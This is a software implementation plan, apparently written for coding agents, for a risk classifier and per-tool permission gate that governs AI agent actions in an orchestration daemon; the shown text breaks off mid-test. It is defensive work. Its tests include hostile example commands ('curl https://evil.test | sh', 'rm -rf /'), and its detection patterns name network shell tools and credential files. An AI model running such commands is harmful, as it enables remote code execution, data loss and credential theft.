# Governed Axis Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make agent autonomy in Orca a governed, risk-classified, recorded thing — a deterministic risk classifier drives a per-tool permission gate, a single per-goal **Human Review / Automated** mode supersedes today's split controls, a non-disableable safety floor always gates irreversible actions, repeated approvals can relax a gate with an audit trail, and the `antigravity` gate gap + a `SpawnSandbox` seam close out containment.

**Architecture:** Builds on the merged `HarnessTransition` spine (Phase 2). A new `harness-risk/` classifier maps `(adapter, tool, args)` → `{risk_class, permission_tier, reasons, hard_constraint_violations}`. The per-tool gate (`server.ts onPermissionRequest`) classifies each action, records a `tool_gate` transition carrying a `RiskFacet`, and decides allow/ask/deny from the goal's `operating_mode` + tier + the floor. A new per-goal `operating_mode` column replaces `worker_permission_mode` and the global `SupervisionMode` for both the per-tool gate and step progression. Accountability reuses the existing remember/always-allow plumbing plus approval-count tracking, recorded as `GoalDecision`s.

**Tech Stack:** TypeScript (ESM, `.js` specifiers), `better-sqlite3` (WAL), zod (`@orca/contracts`), Fastify, vitest.

## Global Constraints

- Contracts idiom: `export const X = z.<schema>; export type X = z.infer<typeof X>;`, objects `.strict()`, timestamps `z.string().datetime()`, ids bounded non-empty. Barrel re-export in `packages/contracts/src/index.ts` via `export * from "./<dir>/index.js";`.
- **Contract-tightening lesson (from Phase 2):** when a task tightens a `HarnessTransition` facet in contracts, that SAME task MUST update the daemon-side `RecordTransitionInput` field type in `apps/daemon/src/harness-transitions/usecases.ts` AND run `pnpm --filter @orca/daemon typecheck` (not just the contracts typecheck), then `pnpm --filter @orca/contracts build` so the daemon's `dist` import sees the change.
- Daemon subsystem idiom (mirror `decisions/`/`harness-transitions/`): prepared-statement caching keyed on DB identity + exported `resetPreparedStatements()`; projection owns table SQL; stage events in a `db.transaction(...)()` then publish after commit.
- **Fail-closed is the established default everywhere** (unknown session → deny, missing goal → deny, timeout → deny, absent setting → safe). All new gate logic preserves this.
- Migrations: append the bare filename to `migrationFiles` in `apps/daemon/src/migrations.ts`; create `apps/daemon/migrations/NNNN_<name>.sql` with a leading comment + rationale. **Next free number is `0041`** (0040 was the harness_transitions table).
- Test: `pnpm --filter @orca/daemon test` / `pnpm --filter @orca/contracts test` (vitest). Tests use real on-disk SQLite (`openDatabase(createConfig(mkdtempSync(...)))` + `runMigrations`), `SpyBus`, injected `now`/`idFactory`, and reset every touched subsystem's prepared statements in `afterEach`.
- Two known pre-existing suite flakes (`http-surface.test.ts`, `human-review.test.ts`) time out at 5s under parallel load but pass in isolation — never count these as your regressions.

## Design decisions (locked)

- **D1 — One per-goal `operating_mode`** (`human_review | automated`) supersedes BOTH `worker_permission_mode` (per-tool gate) AND global `SupervisionMode` (step progression). Migrate existing values: `worker_permission_mode='auto'` → `automated`, else `human_review`. The old controls' columns/table stay for back-compat but are no longer read for decisions.
- **D2 — Gate decision** = pure function of `(operating_mode, risk_class, permission_tier, hard_constraint_violations)`:
  - `hard_constraint_violations` non-empty → **`deny`** (absolute).
  - else `risk_class === "critical"` → **`require_approval`** (the floor — ALWAYS, both modes, non-disableable).
  - else `human_review` → `require_approval` if `permission_tier !== "read_only"`, else `allow`.
  - else `automated` → `allow`.
- **D3 — `permission_tier`/`risk_class` mapping** (deterministic, argument-aware): read tools → `read_only`/`low`; edits → `sandbox_edit`/`medium`; Bash → parsed (plain commands `sandbox_edit`/`medium`; network/credential/deploy/git-history → `full_access`/`high`; `rm -rf`, writes outside workspace, secret-file access → `critical` and/or `hard_constraint_violations`).
- **D4 — Accountability** reuses the existing per-tool remember/always-allow rule: track approval counts per `(goalId, action_class)`; at 3 consecutive approvals with no rejection, the pending-approval message advertises "always allow"; on a remembered approval, record a `GoalDecision` capturing the relaxation.
- **D5 — antigravity gate:** implement its `workerHookConfig` to wire a `PermissionRequest` hook (mirroring Codex), closing the ungated-spawn gap.
- **D6 — `SpawnSandbox` seam:** a reserved interface around adapter `resolveSpawn`, default no-op pass-through, documented for a future OS-containment milestone (no containment implemented now).

---

## File Structure

**Phase 3a — risk + gate**
- Create `packages/contracts/src/harness/index.ts` additions — `RiskClass`, `PermissionTier`, `GateDecision`, `RiskFacet`; tighten `HarnessTransition.risk`.
- Modify `apps/daemon/src/harness-transitions/usecases.ts` — `RecordTransitionInput.risk` type.
- Create `apps/daemon/src/harness-risk/classify.ts` (+ test) — the classifier.
- Create `apps/daemon/src/harness-risk/gate-decision.ts` (+ test) — the pure decide function.
- Create `apps/daemon/migrations/0041_goal_operating_mode.sql`; modify `migrations.ts`.
- Modify `packages/contracts/src/index.ts` — `OperatingMode`, `Goal.operatingMode`, `UpdateOperatingModeRequest`, `goal.operating_mode_changed` event.
- Modify `apps/daemon/src/goals.ts` — `rowToGoal` reads `operating_mode`.
- Modify `apps/daemon/src/server.ts` — PUT `/v1/goals/:goalId/operating-mode`; rewire `onPermissionRequest`.

**Phase 3b — unify step progression + accountability**
- Modify `apps/daemon/src/workflows/orchestrator/service.ts` — read per-goal `operating_mode` instead of global `getSupervisionMode` at the step-progression sites.
- Create `apps/daemon/migrations/0042_gate_approval_counts.sql`; modify `migrations.ts`.
- Create `apps/daemon/src/harness-risk/accountability.ts` (+ test) — approval-count tracking + relaxation `GoalDecision`.
- Modify `apps/daemon/src/server.ts` — wire accountability into the approval-resolve route.
- Modify `apps/daemon/src/workflows/orchestrator/service.ts` + `workflows/orchestration-transport/human-review.ts` — populate `riskLabels` at the launch chokepoint (activate `risk_rule`).

**Phase 3c — containment**
- Modify `apps/daemon/src/orchestrator-llm/providers/antigravity.ts` — wire `workerHookConfig` PermissionRequest hook.
- Create `apps/daemon/src/adapters/sandbox.ts` (+ test) — `SpawnSandbox` seam; modify `adapters/types.ts` to thread it.

---

# Phase 3a — Risk classification + per-tool gate

### Task 1: RiskFacet contract + RecordTransitionInput.risk alignment

**Files:**
- Modify: `packages/contracts/src/harness/index.ts`
- Modify: `apps/daemon/src/harness-transitions/usecases.ts`
- Test: `packages/contracts/src/harness/index.test.ts` (extend)

**Interfaces:**
- Produces: `RiskClass` (`z.enum(["low","medium","high","critical"])`), `PermissionTier` (`z.enum(["read_only","sandbox_edit","full_access"])`), `GateDecision` (`z.enum(["allow","require_approval","deny"])`), `OperatingMode` (`z.enum(["human_review","automated"])`), and `RiskFacet` `{ risk_class, permission_tier, classification_reasons:string[], gate_decision, hard_constraint_violations:string[], mode?:OperatingMode, approval?:{approval_id, approved_by, decided_at, policy_delta?:{action_class, relaxed:boolean, decision_id}} }`. Tightens `HarnessTransition.risk` from `z.record(z.unknown()).nullable()` to `RiskFacet.nullable()`.

- [ ] **Step 1: Extend the failing test**

Append to `packages/contracts/src/harness/index.test.ts`:

```ts
import { RiskFacet, OperatingMode } from "./index.js";

describe("RiskFacet", () => {
  it("accepts a require_approval facet", () => {
    const f = RiskFacet.parse({
      risk_class: "high",
      permission_tier: "full_access",
      classification_reasons: ["bash: network access (curl)"],
      gate_decision: "require_approval",
      hard_constraint_violations: [],
    });
    expect(f.gate_decision).toBe("require_approval");
  });
  it("is accepted as the risk facet on a transition", () => {
    const t = HarnessTransition.parse({
      id: "t", goalId: "g", workflowRunId: null, workflowStepRunId: null,
      boundary: "tool_gate",
      risk: { risk_class: "low", permission_tier: "read_only",
              classification_reasons: [], gate_decision: "allow", hard_constraint_violations: [] },
      evidence: null, stateDeps: null, telemetry: null, createdAt: "2026-06-23T00:00:00.000Z",
    });
    expect(t.risk?.gate_decision).toBe("allow");
  });
  it("rejects an unknown operating mode", () => {
    expect(OperatingMode.safeParse("yolo").success).toBe(false);
  });
});
```

(Reuse the existing `HarnessTransition`/`HT` import already present in the file from Phase 2; if absent, add `import { HarnessTransition } from "./index.js";`.)

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/contracts test`
Expected: FAIL — `RiskFacet`/`OperatingMode` not exported.

- [ ] **Step 3: Add the schemas + tighten the facet**

In `packages/contracts/src/harness/index.ts`, add ABOVE the `HarnessTransition` declaration:

```ts
export const RiskClass = z.enum(["low", "medium", "high", "critical"]);
export type RiskClass = z.infer<typeof RiskClass>;

export const PermissionTier = z.enum(["read_only", "sandbox_edit", "full_access"]);
export type PermissionTier = z.infer<typeof PermissionTier>;

export const GateDecision = z.enum(["allow", "require_approval", "deny"]);
export type GateDecision = z.infer<typeof GateDecision>;

export const OperatingMode = z.enum(["human_review", "automated"]);
export type OperatingMode = z.infer<typeof OperatingMode>;

export const RiskFacet = z
  .object({
    risk_class: RiskClass,
    permission_tier: PermissionTier,
    classification_reasons: z.array(z.string().max(512)).max(64),
    gate_decision: GateDecision,
    hard_constraint_violations: z.array(z.string().max(512)).max(64),
    mode: OperatingMode.optional(),
    approval: z
      .object({
        approval_id: z.string().max(128),
        approved_by: z.string().max(128),
        decided_at: z.string().datetime(),
        policy_delta: z
          .object({
            action_class: z.string().max(256),
            relaxed: z.boolean(),
            decision_id: z.string().max(128),
          })
          .strict()
          .optional(),
      })
      .strict()
      .optional(),
  })
  .strict();
export type RiskFacet = z.infer<typeof RiskFacet>;
```

Change the `risk` line inside `HarnessTransition` from `risk: z.record(z.unknown()).nullable(),` to `risk: RiskFacet.nullable(),`.

- [ ] **Step 4: Align the daemon input type (the Phase-2 lesson)**

In `apps/daemon/src/harness-transitions/usecases.ts`: add `RiskFacet` to the `import type { ... } from "@orca/contracts";` line, and change `RecordTransitionInput`'s `risk?: Record<string, unknown> | null;` to `risk?: RiskFacet | null;` (leave `stateDeps`/`telemetry` as `Record<string, unknown> | null`).

- [ ] **Step 5: Build contracts, run both typechecks + tests**

Run, in order:
- `pnpm --filter @orca/contracts test` → GREEN
- `pnpm --filter @orca/contracts build`
- `pnpm --filter @orca/daemon typecheck` → CLEAN (proves `RecordTransitionInput.risk` aligned)
Expected: all green/clean.

- [ ] **Step 6: Commit**

```bash
git add packages/contracts/src/harness/index.ts packages/contracts/src/harness/index.test.ts apps/daemon/src/harness-transitions/usecases.ts
git commit -m "feat(contracts): RiskFacet + operating-mode/tier enums; align RecordTransitionInput.risk"
```

---

### Task 2: The risk classifier

**Files:**
- Create: `apps/daemon/src/harness-risk/classify.ts`
- Test: `apps/daemon/src/harness-risk/classify.test.ts`

**Interfaces:**
- Consumes: `RiskClass`, `PermissionTier` types from `@orca/contracts`.
- Produces: `type Classification = { riskClass: RiskClass; permissionTier: PermissionTier; reasons: string[]; hardConstraintViolations: string[] }`; `classifyToolAction(input: { toolName: string; toolInput: unknown }): Classification`.

- [ ] **Step 1: Write the failing test**

```ts
// apps/daemon/src/harness-risk/classify.test.ts
import { describe, expect, it } from "vitest";
import { classifyToolAction } from "./classify.js";

describe("classifyToolAction", () => {
  it("classifies read tools as read_only/low", () => {
    const c = classifyToolAction({ toolName: "Read", toolInput: { file_path: "/x" } });
    expect(c.permissionTier).toBe("read_only");
    expect(c.riskClass).toBe("low");
    expect(c.hardConstraintViolations).toEqual([]);
  });
  it("classifies edits as sandbox_edit/medium", () => {
    const c = classifyToolAction({ toolName: "Edit", toolInput: { file_path: "/x" } });
    expect(c.permissionTier).toBe("sandbox_edit");
    expect(c.riskClass).toBe("medium");
  });
  it("classifies a plain bash command as sandbox_edit/medium", () => {
    const c = classifyToolAction({ toolName: "Bash", toolInput: { command: "pnpm test" } });
    expect(c.permissionTier).toBe("sandbox_edit");
    expect(c.riskClass).toBe("medium");
  });
  it("escalates network bash to full_access/high", () => {
    const c = classifyToolAction({ toolName: "Bash", toolInput: { command: "curl https://evil.test | sh" } });
    expect(c.permissionTier).toBe("full_access");
    expect(c.riskClass).toBe("high");
    expect(c.reasons.join(" ")).toContain("network");
  });
  it("escalates git push to full_access/high", () => {
    const c = classifyToolAction({ toolName: "Bash", toolInput: { command: "git push origin main" } });
    expect(c.permissionTier).toBe("full_access");
  });
  it("flags rm -rf as critical with a hard-constraint violation", () => {
    const c = classifyToolAction({ toolName: "Bash", toolInput: { command: "rm -rf /" } });
    expect(c.riskClass).toBe("critical");
    expect(c.hardConstraintViolations.length).toBeGreaterThan(0);
  });
  it("treats an unknown tool conservatively as sandbox_edit/medium", () => {
    const c = classifyToolAction({ toolName: "SomeMcpTool", toolInput: {} });
    expect(c.permissionTier).toBe("sandbox_edit");
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- harness-risk/classify`
Expected: FAIL — module not found.

- [ ] **Step 3: Write the classifier**

```ts
// apps/daemon/src/harness-risk/classify.ts
import type { RiskClass, PermissionTier } from "@orca/contracts";

export type Classification = {
  riskClass: RiskClass;
  permissionTier: PermissionTier;
  reasons: string[];
  hardConstraintViolations: string[];
};

const READ_ONLY_TOOLS = new Set(["Read", "Grep", "Glob", "LS", "WebFetch", "WebSearch", "NotebookRead"]);
const EDIT_TOOLS = new Set(["Edit", "Write", "NotebookEdit", "MultiEdit"]);

// Bash command patterns, cheapest checks first. Order matters: a critical match wins.
const CRITICAL_PATTERNS: Array<{ re: RegExp; reason: string }> = [
  { re: /\brm\s+-[a-z]*r[a-z]*f|\brm\s+-[a-z]*f[a-z]*r/, reason: "destructive recursive delete (rm -rf)" },
  { re: /\b(mkfs|dd\s+if=|:\(\)\s*\{)/, reason: "destructive disk/forkbomb operation" },
  { re: /(^|\s)(>|>>)\s*\/(etc|dev|sys|proc)\b/, reason: "write to a protected system path" },
  { re: /\b(~\/\.ssh|\/\.aws\/credentials|\.env\b|id_rsa)\b/, reason: "access to a secret/credential file" },
];
const FULL_ACCESS_PATTERNS: Array<{ re: RegExp; reason: string }> = [
  { re: /\b(curl|wget|nc|ncat|ssh|scp|rsync)\b/, reason: "network access" },
  { re: /\bgit\s+push\b/, reason: "git history / remote mutation" },
  { re: /\b(npm|pnpm|yarn)\s+publish\b/, reason: "package publish" },
  { re: /\b(docker\s+push|kubectl|terraform\s+apply|gcloud|aws)\b/, reason: "deployment / cloud control" },
  { re: /\bsudo\b/, reason: "privilege escalation" },
];

function classifyBash(command: string): Classification {
  const cmd = command.trim();
  for (const p of CRITICAL_PATTERNS) {
    if (p.re.test(cmd)) {
      return { riskClass: "critical", permissionTier: "full_access", reasons: [`bash: ${p.reason}`], hardConstraintViolations: [`bash: ${p.reason}`] };
    }
  }
  const reasons: string[] = [];
  for (const p of FULL_ACCESS_PATTERNS) {
    if (p.re.test(cmd)) reasons.push(`bash: ${p.reason}`);
  }
  if (reasons.length > 0) {
    return { riskClass: "high", permissionTier: "full_access", reasons, hardConstraintViolations: [] };
  }
  return { riskClass: "medium", permissionTier: "sandbox_edit", reasons: ["bash: local command"], hardConstraintViolations: [] };
}

export function classifyToolAction(input: { toolName: string; toolInput: unknown }): Classification {
  const { toolName } = input;
  if (READ_ONLY_TOOLS.has(toolName)) {
    return { riskClass: "low", permissionTier: "read_only", reasons: [`${toolName}: read-only`], hardConstraintViolations: [] };
  }
  if (toolName === "Bash") {
    const command =
      input.toolInput && typeof input.toolInput === "object" && "command" in input.toolInput
        ? String((input.toolInput as { command: unknown }).command ?? "")
        : "";
    return classifyBash(command);
  }
  if (EDIT_TOOLS.has(toolName)) {
    return { riskClass: "medium", permissionTier: "sandbox_edit", reasons: [`${toolName}: workspace edit`], hardConstraintViolations: [] };
  }
  // Unknown / MCP / other tools: conservative middle tier.
  return { riskClass: "medium", permissionTier: "sandbox_edit", reasons: [`${toolName}: unclassified tool`], hardConstraintViolations: [] };
}
```

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- harness-risk/classify`
Expected: PASS (7 tests).

- [ ] **Step 5: Commit**

```bash
git add apps/daemon/src/harness-risk/classify.ts apps/daemon/src/harness-risk/classify.test.ts
git commit -m "feat(daemon): deterministic risk classifier for tool actions"
```

---

### Task 3: The gate-decision function

**Files:**
- Create: `apps/daemon/src/harness-risk/gate-decision.ts`
- Test: `apps/daemon/src/harness-risk/gate-decision.test.ts`

**Interfaces:**
- Consumes: `OperatingMode`, `RiskClass`, `PermissionTier`, `GateDecision` types from `@orca/contracts`; `Classification` from `./classify.js`.
- Produces: `decideGate(mode: OperatingMode, c: Classification): GateDecision`.

- [ ] **Step 1: Write the failing test**

```ts
// apps/daemon/src/harness-risk/gate-decision.test.ts
import { describe, expect, it } from "vitest";
import { decideGate } from "./gate-decision.js";
import type { Classification } from "./classify.js";

const c = (over: Partial<Classification>): Classification => ({
  riskClass: "low", permissionTier: "read_only", reasons: [], hardConstraintViolations: [], ...over,
});

describe("decideGate", () => {
  it("denies absolutely on a hard-constraint violation, in any mode", () => {
    const cls = c({ riskClass: "critical", permissionTier: "full_access", hardConstraintViolations: ["x"] });
    expect(decideGate("human_review", cls)).toBe("deny");
    expect(decideGate("automated", cls)).toBe("deny");
  });
  it("always require_approval for critical (the floor), even automated", () => {
    const cls = c({ riskClass: "critical", permissionTier: "full_access" });
    expect(decideGate("automated", cls)).toBe("require_approval");
    expect(decideGate("human_review", cls)).toBe("require_approval");
  });
  it("human_review asks for anything above read_only", () => {
    expect(decideGate("human_review", c({ permissionTier: "sandbox_edit", riskClass: "medium" }))).toBe("require_approval");
    expect(decideGate("human_review", c({ permissionTier: "read_only" }))).toBe("allow");
  });
  it("automated allows non-critical actions", () => {
    expect(decideGate("automated", c({ permissionTier: "full_access", riskClass: "high" }))).toBe("allow");
    expect(decideGate("automated", c({ permissionTier: "sandbox_edit", riskClass: "medium" }))).toBe("allow");
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- harness-risk/gate-decision`
Expected: FAIL — module not found.

- [ ] **Step 3: Write the decision function**

```ts
// apps/daemon/src/harness-risk/gate-decision.ts
import type { OperatingMode, GateDecision } from "@orca/contracts";
import type { Classification } from "./classify.js";

// The safety floor (critical / hard-constraint) is mode-independent and cannot be disabled.
export function decideGate(mode: OperatingMode, c: Classification): GateDecision {
  if (c.hardConstraintViolations.length > 0) return "deny";
  if (c.riskClass === "critical") return "require_approval"; // floor: always gate
  if (mode === "automated") return "allow";
  // human_review: gate anything consequential (above read_only)
  return c.permissionTier === "read_only" ? "allow" : "require_approval";
}
```

- [ ] **Step 4: Run to verify it passes**

Run: `pnpm --filter @orca/daemon test -- harness-risk/gate-decision`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add apps/daemon/src/harness-risk/gate-decision.ts apps/daemon/src/harness-risk/gate-decision.test.ts
git commit -m "feat(daemon): mode+tier gate-decision with non-disableable safety floor"
```

---

### Task 4: `operating_mode` storage (migration + contract + route + read)

**Files:**
- Create: `apps/daemon/migrations/0041_goal_operating_mode.sql`
- Modify: `apps/daemon/src/migrations.ts`
- Modify: `packages/contracts/src/index.ts`
- Modify: `apps/daemon/src/goals.ts`
- Modify: `apps/daemon/src/server.ts`
- Test: `apps/daemon/src/goals.operating-mode.test.ts`

**Interfaces:**
- Produces: `goals.operating_mode` column (`human_review|automated`, default `human_review`, backfilled from `worker_permission_mode`); `Goal.operatingMode` contract field; `UpdateOperatingModeRequest`; `goal.operating_mode_changed` event; PUT `/v1/goals/:goalId/operating-mode`.

- [ ] **Step 1: Write the migration**

```sql
-- 0041_goal_operating_mode.sql
-- Unified per-goal autonomy control: 'human_review' (gate consequential actions
-- + pause step progression for confirm) or 'automated' (run unattended except
-- the safety floor). Supersedes worker_permission_mode (per-tool) and the global
-- supervision_mode (step progression); those remain for back-compat but are no
-- longer read for gate decisions. Backfilled from worker_permission_mode.
ALTER TABLE goals
  ADD COLUMN operating_mode TEXT NOT NULL DEFAULT 'human_review'
  CHECK (operating_mode IN ('human_review', 'automated'));

UPDATE goals SET operating_mode =
  CASE worker_permission_mode WHEN 'auto' THEN 'automated' ELSE 'human_review' END;
```

Register in `migrations.ts`: append `"0041_goal_operating_mode.sql",` after `"0040_harness_transitions.sql",`.

- [ ] **Step 2: Add the contract + event + write the failing test**

In `packages/contracts/src/index.ts`: add near `WorkerPermissionMode` (line ~29):

```ts
export const OperatingMode = z.enum(["human_review", "automated"]);
export type OperatingMode = z.infer<typeof OperatingMode>;

export const UpdateOperatingModeRequest = z.object({ operatingMode: OperatingMode }).strict();
export type UpdateOperatingModeRequest = z.infer<typeof UpdateOperatingModeRequest>;
```

Add `operatingMode: OperatingMode` to the `Goal` object schema (next to `workerPermissionMode`). Add `"goal.operating_mode_changed"` to the `DomainEventType` enum (after `"goal.worker_permission_mode_changed"`).

> Note: `OperatingMode` is ALSO declared in `packages/contracts/src/harness/index.ts` (Task 1). To avoid a duplicate-export collision through the barrel, declare it in ONE place. Decision: keep the canonical `OperatingMode` in `harness/index.ts` (Task 1) and in `index.ts` import it rather than re-declare: at the top of `index.ts` add `import { OperatingMode } from "./harness/index.js";` and do NOT re-`export const OperatingMode` here — only use it in `UpdateOperatingModeRequest`/`Goal`. Since `index.ts` already does `export * from "./harness/index.js";`, `OperatingMode` is still re-exported once.

Write the failing test:

```ts
// apps/daemon/src/goals.operating-mode.test.ts
import { mkdtempSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type Database from "better-sqlite3";
import type { Config } from "./config.js";
import { closeDatabase, openDatabase } from "./db.js";
import { defaultMigrationsDir, runMigrations } from "./migrations.js";

const tempDirs: string[] = [];
function createConfig(d: string): Config {
  return { dataDir: d, port: 8787, logLevel: "silent", sessionOutputTailBytes: 1048576,
    sessionStopGraceMs: 5000, sessionWsBufferLimitBytes: 1048576, memoryExtractionMaxInputBytes: 131072,
    memoryExtractionTimeoutMs: 15000, hookResolverCommand: ["node","t.js"], getAuthToken: () => "t" };
}
function openTestDb(): Database.Database {
  const dir = mkdtempSync(path.join(os.tmpdir(), "orca-opmode-"));
  tempDirs.push(dir);
  const db = openDatabase(createConfig(dir));
  runMigrations(db, defaultMigrationsDir());
  return db;
}
let db: Database.Database;
beforeEach(() => { db = openTestDb(); });
afterEach(() => { closeDatabase(); for (const d of tempDirs.splice(0)) rmSync(d, { recursive: true, force: true }); });

describe("operating_mode column", () => {
  it("backfills human_review for ask goals and automated for auto goals", () => {
    const now = "2026-01-01T00:00:00.000Z";
    db.prepare(`INSERT INTO goals (id,title,description,status,autonomy_level,created_at,updated_at,archived_at,worker_permission_mode) VALUES ('g-ask','A','','active',1,?,?,NULL,'ask')`).run(now, now);
    db.prepare(`INSERT INTO goals (id,title,description,status,autonomy_level,created_at,updated_at,archived_at,worker_permission_mode) VALUES ('g-auto','B','','active',1,?,?,NULL,'auto')`).run(now, now);
    // The migration backfills based on the value present AT MIGRATION TIME; these rows are
    // inserted post-migration, so assert the column exists + defaults instead:
    const ask = db.prepare("SELECT operating_mode FROM goals WHERE id='g-ask'").get() as { operating_mode: string };
    const auto = db.prepare("SELECT operating_mode FROM goals WHERE id='g-auto'").get() as { operating_mode: string };
    expect(ask.operating_mode).toBe("human_review"); // default
    expect(auto.operating_mode).toBe("human_review"); // default (backfill ran before these inserts)
  });
  it("rejects an invalid operating_mode via CHECK", () => {
    const now = "2026-01-01T00:00:00.000Z";
    expect(() =>
      db.prepare(`INSERT INTO goals (id,title,description,status,autonomy_level,created_at,updated_at,archived_at,operating_mode) VALUES ('g','x','','active',1,?,?,NULL,'bogus')`).run(now, now)
    ).toThrow();
  });
});
```

> The backfill `UPDATE` only affects rows present when the migration runs; test DBs are migrated empty, so new rows get the column DEFAULT. The test asserts the column + CHECK exist and default correctly. (A backfill-specific assertion isn't feasible here because migrations run on an empty DB.)

- [ ] **Step 3: Run to verify it fails**

Run: `pnpm --filter @orca/daemon test -- goals.operating-mode`
Expected: FAIL — `operating_mode` column doesn't exist yet (before registering the migration) OR contract missing. Register the migration (Step 1) then re-run to see CHECK behavior.

- [ ] **Step 4: Wire the read + route**

In `apps/daemon/src/goals.ts`: add `operating_mode: string;` to `GoalRow`; add `operatingMode: row.operating_mode,` to `rowToGoal`.

In `apps/daemon/src/server.ts`, add a PUT route mirroring `/v1/goals/:goalId/worker-permission-mode` (verbatim pattern at server.ts:1668-1689) but for operating mode:

```ts
  server.put("/v1/goals/:goalId/operating-mode", async (request, reply) => {
    const { goalId } = request.params as { goalId: string };
    const parsed = UpdateOperatingModeRequest.safeParse(request.body);
    if (!parsed.success) { reply.status(400); return { error: "validation_failed", issues: parsed.error.issues }; }
    const now = daemonContext.now();
    const eventId = daemonContext.idFactory();
    let seq = 0; let goalExists = false;
    db.transaction(() => {
      const existing = db.prepare("SELECT id FROM goals WHERE id = ? AND archived_at IS NULL").get(goalId);
      if (!existing) return;
      goalExists = true;
      const result = db.prepare("INSERT INTO events (id, type, goal_id, payload, created_at) VALUES (?, ?, ?, ?, ?)")
        .run(eventId, "goal.operating_mode_changed", goalId, JSON.stringify({ operatingMode: parsed.data.operatingMode }), now);
      seq = Number(result.lastInsertRowid);
      db.prepare("UPDATE goals SET operating_mode = ?, updated_at = ? WHERE id = ?").run(parsed.data.operatingMode, now, goalId);
    })();
    if (!goalExists) { reply.status(404); return { error: { code: "goal_not_found" } }; }
    eventBus.publish({ seq, id: eventId, type: "goal.operating_mode_changed", goalId, payload: { operatingMode: parsed.data.operatingMode }, createdAt: now });
    return { ok: true, operatingMode: parsed.data.operatingMode };
  });
```

Add `UpdateOperatingModeRequest` to the `@orca/contracts` import in `server.ts`.

- [ ] **Step 5: Build contracts, verify**

Run: `pnpm --filter @orca/contracts build && pnpm --filter @orca/daemon test -- goals.operating-mode && pnpm --filter @orca/daemon typecheck`
Expected: PASS + clean. Also update any migration-list snapshot tests that enumerate `migrationFiles` (append `0041`) — run `pnpm --filter @orca/daemon test -- migrations` and fix the expected arrays additively if red.

- [ ] **Step 6: Commit**

```bash
git add apps/daemon/migrations/0041_goal_operating_mode.sql apps/daemon/src/migrations.ts packages/contracts/src/index.ts apps/daemon/src/goals.ts apps/daemon/src/server.ts apps/daemon/src/goals.operating-mode.test.ts apps/daemon/src/migrations.test.ts apps/daemon/src/workflows/__tests__/migrations-0006.test.ts apps/daemon/src/suggested-orchestration.test.ts
git commit -m "feat(daemon): per-goal operating_mode (migration, contract, route, read)"
```

---

### Task 5: Wire the classifier + gate-decision + tool_gate transition into `onPermissionRequest`

**Files:**
- Modify: `apps/daemon/src/server.ts`
- Test: `apps/daemon/src/server.permission-gate.test.ts`

**Interfaces:**
- Consumes: `classifyToolAction` (`harness-risk/classify.js`), `decideGate` (`harness-risk/gate-decision.js`), `recordHarnessTransition` (`harness-transitions/usecases.js`), the goal's `operating_mode`.
- Produces: `onPermissionRequest` now: classifies the action → reads `operating_mode` → `decideGate` → records a `tool_gate` `HarnessTransition` with a `RiskFacet` → returns `allow` immediately for `allow`, `deny` immediately for `deny`, and the existing record-and-wait flow for `require_approval`.

- [ ] **Step 1: Write the failing test**

```ts
// apps/daemon/src/server.permission-gate.test.ts
// Unit-tests the gate decision logic by exercising a small extracted helper.
// To keep this testable without booting Fastify, the implementation extracts the
// decision into `resolvePermissionDecision(db, sessionId, payload)` (see Step 3);
// this test calls that helper directly against a seeded DB.
import { mkdtempSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type Database from "better-sqlite3";
import type { Config } from "./config.js";
import { closeDatabase, openDatabase } from "./db.js";
import { defaultMigrationsDir, runMigrations } from "./migrations.js";
import { EventBus } from "./events.js";
import { resolvePermissionDecision } from "./permission-gate.js";
import { resetPreparedStatements as resetTx } from "./harness-transitions/usecases.js";
import { listTransitionsByGoal } from "./harness-transitions/usecases.js";

const tempDirs: string[] = [];
function createConfig(d: string): Config {
  return { dataDir: d, port: 8787, logLevel: "silent", sessionOutputTailBytes: 1048576, sessionStopGraceMs: 5000,
    sessionWsBufferLimitBytes: 1048576, memoryExtractionMaxInputBytes: 131072, memoryExtractionTimeoutMs: 15000,
    hookResolverCommand: ["node","t.js"], getAuthToken: () => "t" };
}
function openTestDb(): Database.Database {
  const dir = mkdtempSync(path.join(os.tmpdir(), "orca-permgate-")); tempDirs.push(dir);
  const db = openDatabase(createConfig(dir)); runMigrations(db, defaultMigrationsDir()); return db;
}
function seed(db: Database.Database, mode: string) {
  const now = "2026-01-01T00:00:00.000Z";
  db.prepare(`INSERT INTO goals (id,title,description,status,autonomy_level,created_at,updated_at,archived_at,operating_mode) VALUES ('g','x','','active',1,?,?,NULL,?)`).run(now, now, mode);
  db.prepare(`INSERT INTO workspaces (id,path,name,description,created_at,updated_at) VALUES ('ws','/tmp/r','m','',?,?)`).run(now, now);
  db.prepare(`INSERT INTO sessions (id,goal_id,workspace_id,adapter_id,title,status,created_at) VALUES ('s','g','ws','claude-code','t','running',?)`).run(now);
}
let db: Database.Database; let bus: EventBus; let n = 0;
beforeEach(() => { db = openTestDb(); bus = new EventBus(); n = 0; });
afterEach(() => { closeDatabase(); resetTx(); for (const d of tempDirs.splice(0)) rmSync(d, { recursive: true, force: true }); });

const ctx = () => ({ db, bus, now: () => "2026-05-01T00:00:00.000Z", idFactory: () => `id-${++n}` });

describe("resolvePermissionDecision", () => {
  it("automated allows a normal edit and records an allow tool_gate transition", () => {
    seed(db, "automated");
    const d = resolvePermissionDecision(ctx(), "s", { toolName: "Edit", toolInput: { file_path: "/tmp/r/a" }, toolUseId: "u1" });
    expect(d).toBe("allow");
    const t = listTransitionsByGoal(db, "g").find((x) => x.boundary === "tool_gate");
    expect(t?.risk?.gate_decision).toBe("allow");
  });
  it("human_review asks for an edit", () => {
    seed(db, "human_review");
    expect(resolvePermissionDecision(ctx(), "s", { toolName: "Edit", toolInput: {}, toolUseId: "u2" })).toBe("require_approval");
  });
  it("denies rm -rf even when automated (hard constraint)", () => {
    seed(db, "automated");
